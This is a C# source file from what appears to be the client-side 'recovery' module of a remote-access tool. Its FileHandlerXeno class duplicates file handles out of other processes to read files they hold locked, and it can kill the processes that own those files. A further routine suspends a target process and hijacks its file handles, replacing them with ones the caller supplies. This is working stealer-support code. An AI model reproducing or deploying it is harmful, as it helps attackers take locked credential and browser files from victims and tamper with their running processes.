using Pulsar.Client.Recovery.Utilities.Xeno;
using System;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using static Pulsar.Client.Recovery.Utilities.Xeno.InternalStructsXeno;

class FileHandlerXeno
{
    private static InternalStructsXeno.SYSTEM_HANDLE_INFORMATION_EX? pGlobal_SystemHandleInfo = null;
    private static IntPtr pGlobal_SystemHandleInfoBuffer = IntPtr.Zero;

    public static string GetPathFromHandle(IntPtr file)
    {
        uint FILE_NAME_NORMALIZED = 0x0;

        StringBuilder FileNameBuilder = new StringBuilder(32767 + 2);//+2 for a possible null byte?
        uint pathLen = NativeMethodsXeno.GetFinalPathNameByHandleW(file, FileNameBuilder, (uint)FileNameBuilder.Capacity, FILE_NAME_NORMALIZED);
        if (pathLen == 0)
        {
            return null;
        }
        string FileName = FileNameBuilder.ToString(0, (int)pathLen);
        return FileName;
    }

    public static bool DupHandle(int sourceProc, IntPtr sourceHandle, out IntPtr newHandle)
    {
        newHandle = IntPtr.Zero;
        uint PROCESS_DUP_HANDLE = 0x0040;
        uint DUPLICATE_SAME_ACCESS = 0x00000002;
        IntPtr procHandle = NativeMethodsXeno.OpenProcess(PROCESS_DUP_HANDLE, false, (uint)sourceProc);
        if (procHandle == IntPtr.Zero)
        {
            return false;
        }

        IntPtr targetHandle = IntPtr.Zero;

        if (!NativeMethodsXeno.DuplicateHandle(procHandle, sourceHandle, NativeMethodsXeno.GetCurrentProcess(), ref targetHandle, 0, false, DUPLICATE_SAME_ACCESS))
        {
            NativeMethodsXeno.CloseHandle(procHandle);
            return false;

        }
        newHandle = targetHandle;
        NativeMethodsXeno.CloseHandle(procHandle);
        return true;
    }

    public static byte[] ReadFileBytesFromHandle(IntPtr handle)
    {
        uint PAGE_READONLY = 0x02;
        uint FILE_MAP_READ = 0x04;
        IntPtr fileMapping = NativeMethodsXeno.CreateFileMappingA(handle, IntPtr.Zero, PAGE_READONLY, 0, 0, null);
        if (fileMapping == IntPtr.Zero)
        {
            return null;
        }

        if (!NativeMethodsXeno.GetFileSizeEx(handle, out ulong fileSize))
        {
            NativeMethodsXeno.CloseHandle(fileMapping);
            return null;
        }

        IntPtr BaseAddress = NativeMethodsXeno.MapViewOfFile(fileMapping, FILE_MAP_READ, 0, 0, (UIntPtr)fileSize);
        if (BaseAddress == IntPtr.Zero)
        {
            NativeMethodsXeno.CloseHandle(fileMapping);
            return null;
        }

        byte[] FileData = new byte[fileSize];

        Marshal.Copy(BaseAddress, FileData, 0, (int)fileSize);

        NativeMethodsXeno.UnmapViewOfFile(BaseAddress);
        NativeMethodsXeno.CloseHandle(fileMapping);

        return FileData;
    }

    public static bool KillProcess(int pid, uint exitcode = 0)
    {
        uint PROCESS_TERMINATE = 0x0001;
        IntPtr ProcessHandle = NativeMethodsXeno.OpenProcess(PROCESS_TERMINATE, false, (uint)pid);
        if (ProcessHandle == IntPtr.Zero)
        {
            return false;
        }

        bool result = NativeMethodsXeno.TerminateProcess(ProcessHandle, exitcode);
        NativeMethodsXeno.CloseHandle(ProcessHandle);
        return result;
    }

    public static string ForceReadFileString(string filePath, bool killOwningProcessIfCouldntAquire = false)
    {
        byte[] fileContent = ForceReadFile(filePath, killOwningProcessIfCouldntAquire);
        if (fileContent == null)
        {
            return null;
        }
        try
        {
            return Encoding.UTF8.GetString(fileContent);
        }
        catch
        {
        }
        return null;
    }

    public static bool GetProcessLockingFile(string filePath, out int[] process)
    {
        process = null;
        uint ERROR_MORE_DATA = 0xEA;

        string key = Guid.NewGuid().ToString();
        if (NativeMethodsXeno.RmStartSession(out uint SessionHandle, 0, key) != 0)
        {
            return false;
        }

        string[] resourcesToCheckAgaist = new string[] { filePath };
        if (NativeMethodsXeno.RmRegisterResources(SessionHandle, (uint)resourcesToCheckAgaist.Length, resourcesToCheckAgaist, 0, null, 0, null) != 0)
        {
            NativeMethodsXeno.RmEndSession(SessionHandle);
            return false;
        }



        while (true)
        {
            uint nProcInfo = 0;
            uint status = NativeMethodsXeno.RmGetList(SessionHandle, out uint nProcInfoNeeded, ref nProcInfo, null, out RM_REBOOT_REASON RebootReasions);
            if (status != ERROR_MORE_DATA)
            {
                NativeMethodsXeno.RmEndSession(SessionHandle);
                process = new int[0];
                return true;
            }
            uint oldnProcInfoNeeded = nProcInfoNeeded;
            RM_PROCESS_INFO[] AffectedApps = new RM_PROCESS_INFO[nProcInfoNeeded];
            nProcInfo = nProcInfoNeeded;
            status = NativeMethodsXeno.RmGetList(SessionHandle, out nProcInfoNeeded, ref nProcInfo, AffectedApps, out RebootReasions);
            if (status == 0)
            {
                process = new int[AffectedApps.Length];
                for (int i = 0; i < AffectedApps.Length; i++)
                {
                    process[i] = (int)AffectedApps[i].Process.dwProcessId;
                }
                break;
            }
            if (oldnProcInfoNeeded != nProcInfoNeeded)
            {
                continue;
            }
            else
            {
                NativeMethodsXeno.RmEndSession(SessionHandle);
                return false;
            }
        }
        NativeMethodsXeno.RmEndSession(SessionHandle);
        return true;
    }

    public static byte[] ForceReadFile(string filePath, bool killOwningProcessIfCouldntAquire = false)
    {
        try
        {
            return File.ReadAllBytes(filePath);
        }
        catch (Exception e)
        {
            if (e.HResult != -2147024864) //this is the error for if the file is being used by another process
            {
                return null;
            }
        }

        bool Pidless = false;

        if (!GetProcessLockingFile(filePath, out int[] process))
        {
            Pidless = true;
        }

        uint dwSize = 0;
        uint status = 0;
        uint STATUS_INFO_LENGTH_MISMATCH = 0xC0000004;


        int HandleStructSize = Marshal.SizeOf(typeof(InternalStructsXeno.SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX));

        IntPtr pInfo = Marshal.AllocHGlobal(HandleStructSize);
        do
        {
            status = NativeMethodsXeno.NtQuerySystemInformation(InternalStructsXeno.SYSTEM_INFORMATION_CLASS.SystemExtendedHandleInformation, pInfo, dwSize, out dwSize);
            if (status == STATUS_INFO_LENGTH_MISMATCH)
            {
                pInfo = Marshal.ReAllocHGlobal(pInfo, (IntPtr)dwSize);
            }
        } while (status != 0);


        //ULONG_PTR NumberOfHandles;
        //ULONG_PTR Reserved;
        //SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];

        IntPtr pInfoBackup = pInfo;

        ulong NumOfHandles = (ulong)Marshal.ReadIntPtr(pInfo);

        pInfo += 2 * IntPtr.Size;//skip past the number of handles and the reserved and start at the handles.

        byte[] result = null;

        for (ulong i = 0; i < NumOfHandles; i++)
        {
            InternalStructsXeno.SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX HandleInfo = Marshal.PtrToStructure<InternalStructsXeno.SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX>(pInfo + (int)(i * (uint)HandleStructSize));


            if (!Pidless && !process.Contains((int)(uint)HandleInfo.UniqueProcessId))
            {
                continue;
            }


            if (DupHandle((int)HandleInfo.UniqueProcessId, (IntPtr)(ulong)HandleInfo.HandleValue, out IntPtr duppedHandle))
            {
                if (NativeMethodsXeno.GetFileType(duppedHandle) != InternalStructsXeno.FileType.FILE_TYPE_DISK)
                {
                    NativeMethodsXeno.CloseHandle(duppedHandle);
                    continue;
                }

                string name = GetPathFromHandle(duppedHandle);

                if (name == null)
                {
                    NativeMethodsXeno.CloseHandle(duppedHandle);
                    continue;
                }

                if (name.StartsWith("\\\\?\\"))
                {
                    name = name.Substring(4);
                }

                if (name == filePath)
                {
                    result = ReadFileBytesFromHandle(duppedHandle);
                    NativeMethodsXeno.CloseHandle(duppedHandle);
                    if (result != null)
                    {
                        break;
                    }
                }

                NativeMethodsXeno.CloseHandle(duppedHandle);

            }


        }
        Marshal.FreeHGlobal(pInfoBackup);

        if (result == null && killOwningProcessIfCouldntAquire)
        {
            foreach (int i in process)
            {
                KillProcess(i);
            }

            try
            {
                result = File.ReadAllBytes(filePath);
            }
            catch
            {
            }

        }

        return result;
    }

    //AI translated C code. https://web.archive.org/web/20240122161954/https://www.x86matthew.com/view_post?id=hijack_file_handle
    public static bool GetFileHandleObjectType(out uint pdwFileHandleObjectType)
    {
        pdwFileHandleObjectType = 0;

        // get the file path of the current exe
        string szPath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;

        // open the current exe
        IntPtr hFile = NativeMethodsXeno.CreateFileW(szPath, NativeMethodsXeno.GENERIC_READ, NativeMethodsXeno.FILE_SHARE_READ, IntPtr.Zero, NativeMethodsXeno.OPEN_EXISTING, 0, IntPtr.Zero);
        if (hFile == NativeMethodsXeno.INVALID_HANDLE_VALUE)
        {
            return false;
        }

        // take a snapshot of the system handle list
        if (GetSystemHandleList() != 0)
        {
            NativeMethodsXeno.CloseHandle(hFile);
            return false;
        }

        // close the temporary file handle
        NativeMethodsXeno.CloseHandle(hFile);

        // find the temporary file handle in the previous snapshot
        if (!pGlobal_SystemHandleInfo.HasValue)
            return false;

        var handleInfo = pGlobal_SystemHandleInfo.Value;
        int handleCount = (int)handleInfo.NumberOfHandles;
        IntPtr handleListPtr = pGlobal_SystemHandleInfoBuffer + 2 * IntPtr.Size;

        for (int i = 0; i < handleCount; i++)
        {
            var entry = Marshal.PtrToStructure<InternalStructsXeno.SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX>(handleListPtr + i * Marshal.SizeOf<InternalStructsXeno.SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX>());

            // check if the process ID is correct
            if (entry.UniqueProcessId == (UIntPtr)NativeMethodsXeno.GetCurrentProcessId())
            {
                // check if the handle index is correct
                if (entry.HandleValue == (UIntPtr)(ulong)hFile)
                {
                    // store the file handle object type index
                    pdwFileHandleObjectType = entry.ObjectTypeIndex;
                    return true;
                }
            }
        }

        // ensure the file handle object type was found
        return false;
    }

    private static int GetSystemHandleList()
    {
        uint dwAllocSize = 0;
        uint dwStatus = 0;
        uint dwLength = 0;
        IntPtr pSystemHandleInfoBuffer = IntPtr.Zero;

        // free previous handle info list (if one exists)
        if (pGlobal_SystemHandleInfo != null)
        {
            // Note: In C# we can't directly free like in C++, but we'll reuse
        }

        // get system handle list
        dwAllocSize = 0;
        for (;;)
        {
            if (pSystemHandleInfoBuffer != IntPtr.Zero)
            {
                // free previous inadequately sized buffer
                Marshal.FreeHGlobal(pSystemHandleInfoBuffer);
                pSystemHandleInfoBuffer = IntPtr.Zero;
            }

            if (dwAllocSize != 0)
            {
                // allocate new buffer
                pSystemHandleInfoBuffer = Marshal.AllocHGlobal((int)dwAllocSize);
                if (pSystemHandleInfoBuffer == IntPtr.Zero)
                {
                    return 1;
                }
            }

            // get system handle list
            dwStatus = NativeMethodsXeno.NtQuerySystemInformation(InternalStructsXeno.SYSTEM_INFORMATION_CLASS.SystemExtendedHandleInformation, pSystemHandleInfoBuffer, dwAllocSize, out dwLength);
            if (dwStatus == 0)
            {
                // success
                break;
            }
            else if (dwStatus == 0xC0000004) // STATUS_INFO_LENGTH_MISMATCH
            {
                // not enough space - allocate a larger buffer and try again (also add an extra 1kb to allow for additional handles created between checks)
                dwAllocSize = (dwLength + 1024);
            }
            else
            {
                // other error
                if (pSystemHandleInfoBuffer != IntPtr.Zero)
                    Marshal.FreeHGlobal(pSystemHandleInfoBuffer);
                return 1;
            }
        }

        // store handle info ptr
        pGlobal_SystemHandleInfo = (InternalStructsXeno.SYSTEM_HANDLE_INFORMATION_EX)Marshal.PtrToStructure(pSystemHandleInfoBuffer, typeof(InternalStructsXeno.SYSTEM_HANDLE_INFORMATION_EX));
        pGlobal_SystemHandleInfoBuffer = pSystemHandleInfoBuffer;

        // Note: We keep the buffer allocated for later use
        return 0;
    }

    public static bool ReplaceFileHandle(IntPtr hTargetProcess, IntPtr hExistingRemoteHandle, IntPtr hReplaceLocalHandle)
    {
        IntPtr hClonedFileHandle = IntPtr.Zero;
        IntPtr hRemoteReplacedHandle = IntPtr.Zero;

        const uint DUPLICATE_CLOSE_SOURCE = 0x00000001;
        const uint DUPLICATE_SAME_ACCESS = 0x00000002;

        // close remote file handle
        if (!NativeMethodsXeno.DuplicateHandle(hTargetProcess, hExistingRemoteHandle, NativeMethodsXeno.GetCurrentProcess(), ref hClonedFileHandle, 0, false, DUPLICATE_CLOSE_SOURCE | DUPLICATE_SAME_ACCESS))
        {
            return false;
        }

        // close cloned file handle
        NativeMethodsXeno.CloseHandle(hClonedFileHandle);

        // duplicate local file handle into remote process
        if (!NativeMethodsXeno.DuplicateHandle(NativeMethodsXeno.GetCurrentProcess(), hReplaceLocalHandle, hTargetProcess, ref hRemoteReplacedHandle, 0, false, DUPLICATE_SAME_ACCESS))
        {
            return false;
        }

        // ensure that the new remote handle matches the original value
        if (hRemoteReplacedHandle != hExistingRemoteHandle)
        {
            return false;
        }

        return true;
    }

    public static bool HijackFileHandle(int dwTargetPID, string pTargetFileName, IntPtr hReplaceLocalHandle)
    {
        IntPtr hProcess = IntPtr.Zero;
        IntPtr hClonedFileHandle = IntPtr.Zero;
        uint dwFileHandleObjectType = 0;
        int dwThreadExitCode = 0;
        int dwThreadID = 0;
        IntPtr hThread = IntPtr.Zero;
        GetFileHandlePathThreadParamStruct GetFileHandlePathThreadParam;
        string pLastSlash = null;
        int dwHijackCount = 0;

        const uint PROCESS_DUP_HANDLE = 0x0040;
        const uint PROCESS_SUSPEND_RESUME = 0x800;

        // calculate the object type index for file handles on this system
        if (!GetFileHandleObjectType(out dwFileHandleObjectType))
        {
            return false;
        }

        Console.WriteLine($"Opening process: {dwTargetPID}...");

        // open target process
        hProcess = NativeMethodsXeno.OpenProcess(PROCESS_DUP_HANDLE | PROCESS_SUSPEND_RESUME, false, (uint)dwTargetPID);
        if (hProcess == IntPtr.Zero)
        {
            return false;
        }

        // suspend target process
        if (NativeMethodsXeno.NtSuspendProcess(hProcess) != 0)
        {
            NativeMethodsXeno.CloseHandle(hProcess);
            return false;
        }

        // get system handle list
        if (GetSystemHandleList() != 0)
        {
            NativeMethodsXeno.NtResumeProcess(hProcess);
            NativeMethodsXeno.CloseHandle(hProcess);
            return false;
        }

        if (!pGlobal_SystemHandleInfo.HasValue)
        {
            NativeMethodsXeno.NtResumeProcess(hProcess);
            NativeMethodsXeno.CloseHandle(hProcess);
            return false;
        }

        var handleInfo = pGlobal_SystemHandleInfo.Value;
        int handleCount = (int)handleInfo.NumberOfHandles;
        IntPtr handleListPtr = pGlobal_SystemHandleInfoBuffer + 2 * IntPtr.Size;

        for (int i = 0; i < handleCount; i++)
        {
            var entry = Marshal.PtrToStructure<InternalStructsXeno.SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX>(handleListPtr + i * Marshal.SizeOf<InternalStructsXeno.SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX>());

            // ensure this handle is a file handle object
            if (entry.ObjectTypeIndex != dwFileHandleObjectType)
            {
                continue;
            }

            // ensure this handle is in the target process
            if ((uint)entry.UniqueProcessId != (uint)dwTargetPID)
            {
                continue;
            }

            // clone file handle
            if (!DupHandle((int)(uint)entry.UniqueProcessId, (IntPtr)(ulong)entry.HandleValue, out hClonedFileHandle))
            {
                continue;
            }

            // get the file path of the current handle - do this in a new thread to prevent deadlocks
            GetFileHandlePathThreadParam = new GetFileHandlePathThreadParamStruct();
            GetFileHandlePathThreadParam.hFile = hClonedFileHandle;

            // Note: In C# we can't easily create threads with the same signature, so we'll do it synchronously for now
            string path = GetFileHandlePathFromThread(hClonedFileHandle);

            // close cloned file handle
            NativeMethodsXeno.CloseHandle(hClonedFileHandle);

            if (path == null)
            {
                continue;
            }

            // get last slash in path
            pLastSlash = path.LastIndexOf('\\') >= 0 ? path.Substring(path.LastIndexOf('\\') + 1) : path;

            // check if this is the target filename
            if (string.Compare(pLastSlash, pTargetFileName, StringComparison.OrdinalIgnoreCase) != 0)
            {
                continue;
            }

            // found matching filename
            Console.WriteLine($"Found remote file handle: \"{path}\" (Handle ID: 0x{entry.HandleValue:X})");
            dwHijackCount++;

            // replace the remote file handle
            if (ReplaceFileHandle(hProcess, (IntPtr)(ulong)entry.HandleValue, hReplaceLocalHandle))
            {
                // handle replaced successfully
                Console.WriteLine("Remote file handle hijacked successfully\n");
            }
            else
            {
                // failed to hijack handle
                Console.WriteLine("Failed to hijack remote file handle\n");
            }
        }

        // resume process
        if (NativeMethodsXeno.NtResumeProcess(hProcess) != 0)
        {
            NativeMethodsXeno.CloseHandle(hProcess);
            return false;
        }

        // clean up
        NativeMethodsXeno.CloseHandle(hProcess);

        // ensure at least one matching file handle was found
        if (dwHijackCount == 0)
        {
            Console.WriteLine("No matching file handles found");
            return false;
        }

        return true;
    }

    public static bool CloneFileByHandleHijacking(string sourceFilePath, string destinationFilePath)
    {
        try
        {
            // First, try to copy the file normally
            File.Copy(sourceFilePath, destinationFilePath, true);
            return true;
        }
        catch
        {
            // File is locked, try handle hijacking approach
        }

        // Get processes locking the file
        if (!GetProcessLockingFile(sourceFilePath, out int[] lockingProcesses))
        {
            return false;
        }

        if (lockingProcesses.Length == 0)
        {
            // No locking processes, should have worked above
            return false;
        }

        // Create the destination file
        IntPtr hDestFile = NativeMethodsXeno.CreateFileW(destinationFilePath, NativeMethodsXeno.GENERIC_READ | NativeMethodsXeno.GENERIC_WRITE, NativeMethodsXeno.FILE_SHARE_READ | NativeMethodsXeno.FILE_SHARE_WRITE, IntPtr.Zero, 2 /* CREATE_ALWAYS */, 0, IntPtr.Zero);
        if (hDestFile == NativeMethodsXeno.INVALID_HANDLE_VALUE)
        {
            return false;
        }

        try
        {
            // Copy the current content
            byte[] sourceContent = ForceReadFile(sourceFilePath, false);
            if (sourceContent != null)
            {
                using (FileStream fs = new FileStream(destinationFilePath, FileMode.Create))
                {
                    fs.Write(sourceContent, 0, sourceContent.Length);
                }
            }

            // Now hijack handles in each locking process
            string fileName = Path.GetFileName(sourceFilePath);
            bool success = true;

            foreach (int pid in lockingProcesses)
            {
                if (!HijackFileHandle(pid, fileName, hDestFile))
                {
                    success = false;
                    break;
                }
            }

            return success;
        }
        finally
        {
            NativeMethodsXeno.CloseHandle(hDestFile);
        }
    }

    private struct GetFileHandlePathThreadParamStruct
    {
        public IntPtr hFile;
        public string szPath;
    }

    private static string GetFileHandlePathFromThread(IntPtr hFile)
    {
        const int FILE_NAME_INFORMATION_SIZE = 2048;
        IntPtr bFileInfoBuffer = Marshal.AllocHGlobal(FILE_NAME_INFORMATION_SIZE);
        InternalStructsXeno.IO_STATUS_BLOCK IoStatusBlock = new InternalStructsXeno.IO_STATUS_BLOCK();

        try
        {
            uint status = NativeMethodsXeno.NtQueryInformationFile(hFile, ref IoStatusBlock, bFileInfoBuffer, (uint)FILE_NAME_INFORMATION_SIZE, InternalStructsXeno.FileNameInformation);
            if (status != 0)
            {
                return null;
            }

            uint fileNameLength = (uint)Marshal.ReadInt32(bFileInfoBuffer);

            // validate filename length
            if (fileNameLength >= FILE_NAME_INFORMATION_SIZE - 4)
            {
                return null;
            }

            // convert file path to string
            byte[] fileNameBytes = new byte[fileNameLength];
            Marshal.Copy(bFileInfoBuffer + 4, fileNameBytes, 0, (int)fileNameLength);
            string fileName = Encoding.Unicode.GetString(fileNameBytes);

            return fileName;
        }
        finally
        {
            Marshal.FreeHGlobal(bFileInfoBuffer);
        }
    }
}